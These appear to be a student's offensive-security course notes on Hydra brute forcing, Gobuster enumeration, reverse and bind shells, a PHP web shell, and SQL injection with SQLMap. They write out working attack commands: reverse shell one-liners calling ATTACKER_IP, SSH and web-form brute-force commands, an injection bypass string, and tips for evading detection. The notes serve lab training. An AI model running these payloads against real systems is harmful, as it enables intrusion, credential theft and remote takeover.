# Offensive Security

---

## Overview

This chapter covers the foundational tools and techniques used in offensive security — the practice of thinking and operating like an attacker in order to identify and understand vulnerabilities. The rooms progress from credential attacks with Hydra, to directory discovery with Gobuster, to gaining and maintaining shell access on a compromised system, and finally to exploiting database vulnerabilities through SQL injection.

---

## Hydra

### What is Hydra?

Hydra is an automated password-testing tool used to perform brute force attacks against login services. It works by systematically attempting combinations of usernames and passwords from a provided wordlist until a valid credential pair is found. Rather than guessing manually, Hydra automates and parallelises the process, making it significantly faster.

The options passed to Hydra vary depending on the target service or protocol — different services require different command structures.

---

### Common Flags

| Flag | Description |
| ---- | ----------- |
| `-l` | Specifies a single username to use for login attempts |
| `-P` | Specifies the path to a wordlist of passwords |
| `-t` | Sets the number of parallel threads to run simultaneously |
| `-V` | Verbose mode — displays every login attempt as it happens |

> **Note on `-V` (Verbose):** Verbose output means the tool prints every step and result it generates during execution. This is useful for monitoring progress and troubleshooting during an attack.

---

### Brute Forcing FTP

```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

This attempts to log in to an FTP service using a single username (`user`) and each password in the provided list.

---

### Brute Forcing SSH

```bash
hydra -l <username> -P <full path to passwords> MACHINE_IP -t 4 ssh
```

**Breakdown:**

- `-l <username>` — the SSH username to target
- `-P <path>` — the path to the password wordlist
- `-t 4` — run 4 threads in parallel
- `ssh` — specifies SSH as the target protocol

**Example:**

```bash
hydra -l root -P passwords.txt 10.49.160.7 -t 4 ssh
```

This tells Hydra to attempt SSH login as `root`, cycling through every password in `passwords.txt` with 4 threads running simultaneously.

---

### Brute Forcing Web Forms

Web form attacks require identifying the request type first — either GET or POST — which can be determined by inspecting the login request in the browser's developer tools under the Network tab.

**POST Form:**

```bash
sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

**GET Form:**

```bash
sudo hydra -l <username> -P <wordlist> MACHINE_IP http-get-form "<path>:<login_credentials>:<invalid_response>"
```

**Parameter breakdown:**

| Parameter | Description |
| --------- | ----------- |
| `<path>` | The URL path to the login page, e.g. `/login.php` |
| `<login_credentials>` | The form field names and placeholders for username and password |
| `<invalid_response>` | A string from the page that only appears on a failed login attempt |

**Example:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.160.7 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Here, `^USER^` and `^PASS^` are placeholders Hydra replaces with each username and password attempt. `F=incorrect` tells Hydra that the word "incorrect" in the response indicates a failed login.

---

## Gobuster

### What is Gobuster?

Gobuster is an open-source offensive tool written in Go. It performs enumeration by brute forcing web directories, DNS subdomains, virtual hosts, and cloud storage buckets using a wordlist, then analysing the responses to identify valid targets.

> **Enumeration** means systematically listing all available resources on a target — whether they are publicly accessible or not — in order to map out what exists.

Gobuster is widely used in penetration testing, bug bounty hunting, and security assessments.

---

### Directory Enumeration Mode

The most common use of Gobuster is directory and file enumeration using the `dir` mode:

```bash
gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
```

**Breakdown:**

- `gobuster dir` — activates directory and file enumeration mode
- `-u "http://www.example.thm/"` — the target URL
- `-w /usr/share/wordlists/dirb/small.txt` — the wordlist to use; each entry is appended to the URL and sent as a GET request to check if that path exists
- `-t 64` — run 64 threads simultaneously, significantly improving scan speed

---

### Common Flags Reference

| Flag | Full Flag | Description |
| ---- | --------- | ----------- |
| `-t` | `--threads` | Number of concurrent workers (default: 10). Increase for speed, decrease if resources are limited |
| `-w` | `--wordlist` | Path to the wordlist file used for brute forcing |
| `-x` | `--extensions` | File extensions to search for, e.g. `-x php,js` checks for `index.php`, `index.js` per word |
| `-o` | `--output` | Save scan results to a specified file |
| `-c` | `--cookies` | Pass a cookie (e.g. a Session ID) with every request — useful when target directories are behind a login |
| `-H` | `--headers` | Send a custom HTTP header with each request |
| `-s` | `--status-codes` | Only display results that match specific HTTP status codes, e.g. `200,301` |
| `-b` | `--status-codes-blacklist` | Hide results matching specific codes. Overrides `-s` |
| `-r` | `--follow-redirect` | Follow HTTP redirects (301/302) to the final destination |
| `-k` | `--no-tls-validation` | Skip SSL/TLS certificate verification — essential for CTF labs and self-signed certificates |
| `-n` | `--no-status` | Hide HTTP status codes from output to reduce screen noise |
| `-U` / `-P` | `--username` / `--password` | Used together for authenticated requests when credentials are already known |
| `--delay` | `--delay` | Wait time between requests — increasing this helps the scan blend with normal traffic and avoid detection |
| `--debug` | `--debug` | Troubleshooting tool to diagnose why a command is failing or producing unexpected results |

---

## Shells

### What is a Shell (in Security Context)?

In cybersecurity, a shell refers to a specific shell session that an attacker obtains after compromising a system. Unlike the general definition — software that lets users interact with an OS through a command line — in an offensive context, a shell means the attacker has the ability to execute commands and software on the target system remotely.

### What an Attacker Can Do With Shell Access

Once shell access is obtained, it opens the door to a range of post-exploitation activities:

- **Remote System Control** — execute commands or software directly on the target
- **Privilege Escalation** — if initial access is limited, explore ways to gain higher or administrative-level access
- **Data Exfiltration** — read and copy sensitive data from the compromised system
- **Persistence** — create accounts, plant backdoors, or copy software to maintain future access
- **Post-Exploitation** — deploy malware, create hidden accounts, delete logs or information
- **Pivoting** — use the obtained shell as a foothold to hop through the network and reach other systems. The initial shell becomes a stepping stone, not the final target

---

### Reverse Shell

A reverse shell — also called a "connect-back shell" — is a technique where the **target machine initiates the connection back to the attacker's machine**, rather than the other way around.

This approach is effective because firewalls are typically strict about **incoming** connections but permissive about **outgoing** ones. A reverse shell exploits this asymmetry by having the victim call out, which the firewall treats as legitimate outbound traffic.

#### Setting Up the Listener (Attacker's Machine)

Before delivering a payload to the target, the attacker sets up a Netcat listener to receive the incoming connection:

```bash
nc -lvnp 445
```

| Flag | Meaning |
| ---- | ------- |
| `l` | Listen — wait for an incoming connection rather than initiating one |
| `v` | Verbose — display feedback and progress during the connection |
| `n` | No DNS — skip hostname resolution to make the connection faster |
| `p` | Port — specifies the **attacker's** port number to listen on |

> **Note on port selection:** Any port can be used, but attackers commonly choose ports associated with known services — such as `53` (DNS), `80` (HTTP), `443` (HTTPS), `139`, or `445` (SMB). Using a familiar port number helps the reverse shell traffic blend in with legitimate network activity and avoid detection by security appliances.

#### Reverse Shell Payload — Named Pipe (FIFO)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Breakdown:**

| Part | Explanation |
| ---- | ----------- |
| `rm -f /tmp/f` | Removes any existing file at `/tmp/f` to ensure a clean start |
| `mkfifo /tmp/f` | Creates a Named Pipe (FIFO) — a two-way data tunnel between processes |
| `cat /tmp/f` | Reads from the pipe, waiting for any input sent into it |
| `\| sh -i 2>&1` | Passes pipe input into an interactive shell. `2>&1` redirects error messages into standard output, so errors are sent back over the network instead of appearing on the victim's screen |
| `\| nc ATTACKER_IP ATTACKER_PORT` | Sends command output back to the attacker's machine through Netcat |
| `>/tmp/f` | Redirects output back into the pipe, completing the loop for continuous two-way communication |

> **Personal Note:** The reverse shell exercise was genuinely one of the most exciting moments in this course so far. Watching the listener on your own machine suddenly receive a live shell from the target — fully interactive, executing real commands — makes the concept click in a way that reading about it simply cannot. The FIFO payload looks intimidating at first, but tracing through each component piece by piece makes the logic clear.

---

### Bind Shell

Where a reverse shell has the **victim connect to the attacker**, a bind shell flips this: the **victim opens a port and waits**, and the attacker then connects to it.

#### Bind Shell Payload (Run on the Victim)

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

**Breakdown:**

| Part | Explanation |
| ---- | ----------- |
| `rm -f /tmp/f` | Removes any existing named pipe file to avoid conflicts |
| `mkfifo /tmp/f` | Creates the named pipe for two-way communication |
| `cat /tmp/f` | Reads data from the pipe, waiting for input |
| `\| bash -i 2>&1` | Passes input into an interactive Bash shell. `2>&1` redirects errors back to the attacker |
| `\| nc -l 0.0.0.0 8080` | Starts Netcat in listen mode on all network interfaces at port `8080` — the shell is now exposed and waiting |
| `>/tmp/f` | Sends output back into the pipe, enabling bidirectional communication |

The key structural difference from a reverse shell is `nc -l` — the victim is the one listening, and the attacker connects inward to it.

---

### Reverse Shell vs. Bind Shell

| | Reverse Shell | Bind Shell |
| - | ------------- | ---------- |
| **Who listens?** | Attacker | Victim |
| **Who connects?** | Victim (calls back) | Attacker (connects in) |
| **Firewall behaviour** | Outbound traffic from victim — usually allowed | Inbound traffic to victim — often blocked |
| **Common use** | Most common in real attacks | Less common; useful when outbound rules are strict |

---

### Shell Payloads

Shell payloads are pre-written code snippets used to establish a reverse shell connection from the victim to the attacker. They can be written in various languages depending on what the target system has available.

Below is one representative example from each major language covered:

**Bash:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
Redirects input, output, and error directly through a TCP socket to the attacker.

**PHP:**
```php
<?php $sock=fsockopen("ATTACKER_IP",443); exec("sh <&3 >&3 2>&3"); ?>
```
Opens a socket connection and executes a shell, passing all I/O through it.

**Python:**
```python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```
Uses Python's socket library to connect back, then spawns an interactive Bash shell.

**Other payloads** exist for languages and utilities including AWK, Telnet, and BusyBox — useful in restricted environments where standard tools may not be available.

---

### Alternative Shell Listeners

Beyond standard Netcat, other tools can be used to catch incoming shell connections:

| Tool | Description |
| ---- | ----------- |
| **Rlwrap** | Wraps a listener with GNU readline, adding command history and line editing to the shell session |
| **Ncat** | An improved version of Netcat distributed by the Nmap project — adds features like SSL encryption |
| **Socat** | Creates a socket connection between two data sources, offering more flexibility than standard Netcat |

---

### Web Shell

A web shell is a malicious file — typically written in a server-side language — that is planted on a compromised web server and allows the attacker to execute commands through the browser via a URL.

Web shells can be written in any language the web server supports, including PHP, ASP, JSP, and CGI scripts.

**Example — PHP Web Shell:**

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

This file can be saved as `shell.php` and uploaded to a target server by exploiting vulnerabilities such as:

- Unrestricted file upload
- File inclusion vulnerabilities
- Command injection

Once uploaded, the attacker accesses it through the URL where the file is hosted:

```
http://victim.com/uploads/shell.php
```

Commands are then passed through the URL as a parameter:

```
http://victim.com/uploads/shell.php?cmd=whoami
```

The server executes the command and returns the output directly in the browser.

---

## SQL Injection

### How Websites and Databases Communicate

Modern web applications rely on databases to store and retrieve data — user credentials, product listings, session information, and more. The database itself is managed by a **Database Management System (DBMS)** such as MySQL, PostgreSQL, or Microsoft SQL Server.

Websites communicate with these systems using **Structured Query Language (SQL)**. When a user submits data through a login form or search bar, the website dynamically constructs an SQL query and sends it to the database to fetch or verify the relevant information.

**Example of a dynamic login query:**

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
```

---

### What is SQL Injection?

SQL injection is a vulnerability that occurs when a web application includes user-supplied input **directly in an SQL query without sanitising or validating it first**. This allows an attacker to manipulate the query's logic — breaking out of the intended input context and injecting their own SQL commands.

**Example of an unsanitised query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '';
```

By injecting `' OR '1'='1' --`, the attacker has altered the query so that the `WHERE` condition is always true, bypassing authentication entirely. The `--` comments out the rest of the query.

SQL injection can lead to unauthorised access, full database extraction, data deletion, and in some cases, remote code execution on the server.

---

### SQLMap

SQLMap is an automated tool designed to detect and exploit SQL injection vulnerabilities in web applications. Rather than constructing and testing payloads manually, SQLMap handles the process systematically.

#### Typical Workflow

1. Identify a potentially vulnerable URL — one where user input is included in the request (commonly found via the **Network tab** in the browser's developer tools)
2. Use SQLMap to test that URL for SQL injection vulnerabilities
3. If vulnerable, enumerate the databases, tables, and ultimately extract the data

**Common SQLMap flags used in enumeration:**

| Flag | Description |
| ---- | ----------- |
| `--dbs` | Lists all available databases on the server |
| `--tables` | Lists all tables within a specified database |
| `-D <db>` | Targets a specific database |
| `-T <table>` | Targets a specific table |
| `--dump` | Extracts the contents of a table |

**Example workflow:**

```bash
# Step 1 — Enumerate databases
sqlmap -u "http://target.thm/page?id=1" --dbs

# Step 2 — Enumerate tables in a specific database
sqlmap -u "http://target.thm/page?id=1" -D target_db --tables

# Step 3 — Extract contents of a table
sqlmap -u "http://target.thm/page?id=1" -D target_db -T users --dump
```

The URL passed to SQLMap must be the full GET request URL — including any query parameters — as the injection point is typically within those parameters.
